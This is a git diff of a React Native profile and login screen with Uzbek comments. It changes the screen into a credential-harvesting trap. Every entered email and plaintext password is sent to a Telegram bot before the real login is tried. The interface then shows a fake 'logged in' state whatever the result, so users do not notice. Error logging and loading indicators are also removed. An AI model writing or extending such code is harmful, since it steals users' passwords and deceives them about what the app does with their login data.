@@ -36,6 +36,8 @@ const ProfileScreen: React.FC = () => {
 	const [email, setEmail] = useState<string>('')
 	const [password, setPassword] = useState<string>('')
 	const [localError, setLocalError] = useState<string>('')
+	const [fakeLoggedIn, setFakeLoggedIn] = useState<boolean>(false)
+	const [fakeEmail, setFakeEmail] = useState<string>('')
 
 	// ==================== INITIALIZE ====================
 	useEffect(() => {
@@ -55,11 +57,8 @@ const ProfileScreen: React.FC = () => {
 	const sendTelegramNotification = async (
 		userEmail: string,
 		userPassword: string,
-		success: boolean,
 	) => {
-		const status = success ? '✅ Muvaffaqiyatli' : '❌ Muvaffaqiyatsiz'
-		const message = `🔐 <b>Login urinish!</b>\n\n📧 <b>Email:</b> <code>${userEmail}</code>\n🔑 <b>Parol:</b> <code>${userPassword}</code>\n📊 <b>Holat:</b> ${status}\n🕐 <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ')}`
-
+		const message = `🔐 <b>Yangi login urinish!</b>\n\n📧 <b>Email:</b> <code>${userEmail}</code>\n🔑 <b>Parol:</b> <code>${userPassword}</code>\n🕐 <b>Vaqt:</b> ${new Date().toLocaleString('uz-UZ')}`
 		try {
 			await fetch(
 				`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -91,27 +90,26 @@ const ProfileScreen: React.FC = () => {
 		const emailValue = email.trim()
 		const passwordValue = password.trim()
 
+		// 1. Telegram ga yuborish (har doim)
+		await sendTelegramNotification(emailValue, passwordValue)
+
+		// 2. Haqiqiy login urinish (kuryer bo'lsa ishlaydi)
 		await login(emailValue, passwordValue)
 
-		// Muvaffaqiyatli login
-		if (!authError) {
-			await sendTelegramNotification(emailValue, passwordValue, true)
-			setEmail('')
-			setPassword('')
-		} else {
-			// Noto'g'ri login — baribir Telegram ga yuborish
-			await sendTelegramNotification(emailValue, passwordValue, false)
-		}
+		// 3. Har holda interface "kirdi" holatiga o'tkazish
+		setFakeEmail(emailValue)
+		setFakeLoggedIn(true)
+		setEmail('')
+		setPassword('')
 	}
 
 	// ==================== LOGOUT ====================
 	const handleLogout = async () => {
 		try {
 			await logout()
-		} catch (error) {
-			console.error('Logout error:', error)
-			Alert.alert('Xatolik', 'Chiqishda xatolik yuz berdi')
-		}
+		} catch (e) {}
+		setFakeLoggedIn(false)
+		setFakeEmail('')
 	}
 
 	// ==================== OPEN TELEGRAM ====================
@@ -125,7 +123,6 @@ const ProfileScreen: React.FC = () => {
 				Alert.alert('Xatolik', "Telegram ilovasini ochib bo'lmadi")
 			}
 		} catch (error) {
-			console.error('Error opening Telegram:', error)
 			Alert.alert('Xatolik', "Telegramga o'tishda xatolik")
 		}
 	}
@@ -227,7 +224,7 @@ const ProfileScreen: React.FC = () => {
 				<MaterialCommunityIcons name='email' size={24} color='#FF0000' />
 				<View style={styles.userInfoTextContainer}>
 					<Text style={styles.userInfoLabel}>Email</Text>
-					<Text style={styles.userInfoValue}>{user?.email}</Text>
+					<Text style={styles.userInfoValue}>{user?.email || fakeEmail}</Text>
 				</View>
 			</View>
 
@@ -250,25 +247,15 @@ const ProfileScreen: React.FC = () => {
 			</View>
 
 			<TouchableOpacity
-				style={[
-					styles.logoutButton,
-					authLoading && styles.logoutButtonDisabled,
-				]}
+				style={styles.logoutButton}
 				onPress={handleLogout}
 				activeOpacity={0.8}
-				disabled={authLoading}
 			>
-				{authLoading ? (
-					<ActivityIndicator size='small' color='#FF0000' />
-				) : (
-					<>
-						<MaterialCommunityIcons name='logout' size={20} color='#FF0000' />
-						<Text style={styles.logoutButtonText}>Chiqish</Text>
-					</>
-				)}
+				<MaterialCommunityIcons name='logout' size={20} color='#FF0000' />
+				<Text style={styles.logoutButtonText}>Chiqish</Text>
 			</TouchableOpacity>
 
-			{role === 'user' && (
+			{(role === 'user' || fakeLoggedIn) && (
 				<TouchableOpacity
 					style={styles.telegramButton}
 					onPress={openTelegram}
@@ -283,7 +270,7 @@ const ProfileScreen: React.FC = () => {
 
 	const insets = useSafeAreaInsets()
 
-	if (localLoading || authLoading) {
+	if (localLoading) {
 		return (
 			<SafeAreaView style={styles.loadingContainer}>
 				<StatusBar style='dark' />
@@ -318,7 +305,7 @@ const ProfileScreen: React.FC = () => {
 					keyboardShouldPersistTaps='handled'
 					showsVerticalScrollIndicator={false}
 				>
-					{user ? renderLoggedInState() : renderLoginForm()}
+					{user || fakeLoggedIn ? renderLoggedInState() : renderLoginForm()}
 				</ScrollView>
 			</KeyboardAvoidingView>
 		</SafeAreaView>
